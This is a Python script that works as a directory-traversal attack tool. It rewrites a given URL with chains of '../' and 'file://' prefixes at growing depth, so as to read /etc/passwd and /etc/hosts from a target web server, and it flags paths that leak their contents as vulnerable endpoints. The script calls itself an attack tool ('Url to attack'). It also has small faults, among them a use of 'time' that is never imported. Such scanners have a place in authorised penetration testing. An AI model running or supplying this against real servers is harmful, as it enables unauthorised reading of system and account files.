import re
import argparse
import sys
import requests
import json

"""
Done:
1.directory traversal for one page

TODO: 
2. Scan all pages
3. Load and Store as json file
"""

endpoint_dict = dict()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

match = {
# Linux
"etc/hosts": "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t]?[a-zA-Z0-9-_.]*",
"etc/passwd": "\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*"
}

befvar = (
"",
"./",
"/",
"file:",
"file:/",
"file://",
"file:///",
)

## consider input not satinized

dotvar = (
"",
"/..",
"....//",
"//....",
"../",
"..../"
)



def codecollors(code):
    if str(code).startswith("2"):
        colorized = "\033[92m[" + str(code) + "] \033[0m"
        return colorized
    elif str(code).startswith("3"):
        colorized = "\033[93m[" + str(code) + "] \033[0m"
        return colorized
    elif str(code).startswith("4"):
        colorized = "\033[91m[" + str(code) + "] \033[0m"
        return colorized
    elif str(code).startswith("5"):
        colorized = "\033[94m[" + str(code) + "] \033[0m"
        return colorized
    else:
        return code


class request(object):
    def query(self, url, cookie=None):
        # if cookie:
        #     rawdata = "Cookie: " + cookie
        #     cookie = SimpleCookie()
        #     cookie.load(rawdata)

        req = requests.get(url, cookies=cookie, allow_redirects=False)
        self.raw = req.text
        self.code = req.status_code


def forloop():
    if str(arguments.string) not in str(arguments.url):
        sys.exit("String: " + bcolors.WARNING + arguments.string + bcolors.ENDC + " not found in url: " + bcolors.FAIL + arguments.url + "\n")

    count = 0
    exploit_path = [];
    duplicate = []
    while (count != (arguments.depth + 1)):
        print("[+] Depth: " + str(count))
        for var in dotvar:
            for bvar in befvar:
                for word in match.keys():
                    rewrite = bvar + (var * count) + word
                    fullrewrite = re.sub(arguments.string,  rewrite, arguments.url)

                    if fullrewrite not in duplicate:
                        req = request()
                        req.query(fullrewrite)
                        catchdata = re.findall(str(match[word]), req.raw)
                        if (len(catchdata) != 0):
                            # print(codecollors(req.code) + fullrewrite)
                            # print(" Contents Found: " + str(len(catchdata)))
                            exploit_path.append(fullrewrite)

                        else:
                            if arguments.verbose:
                                print(codecollors(req.code) + fullrewrite)

                        icount = 0
                        # Print match
                        for i in catchdata:
                            # print(" " + bcolors.FAIL + str(i) + bcolors.ENDC)
                            icount = icount + 1
                            if (icount > 10):
                                # print(" [...]")
                                break
                            if arguments.verbose:
                                time.sleep(0)
                    duplicate.append(fullrewrite)

        endpoint_dict[arguments.url] = exploit_path[:2]
        count += 1
    print("Vulnerable endpoint:\n")
    print(endpoint_dict)



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-u', action='store', dest='url', required=True, help='Url to attack.')
    parser.add_argument('--string', '-s', action='store', dest='string', required=True, help='String in --url to attack. Ex: document.pdf')
    # parser.add_argument('--cookie', '-c', action='store', dest='cookie', required=False, help='Document cookie.')
    parser.add_argument('--depth', '-d', action='store', dest='depth', required=False, type=int, default='6', help='How deep we will go?')
    parser.add_argument('--verbose', '-v', action='store_true', required=False, help='Show requests')
    arguments = parser.parse_args()

    banner = "\n\
    Starting run in: \033[94m" + arguments.url + "\033[0m\n\
    \
    "
    print(banner)
forloop()


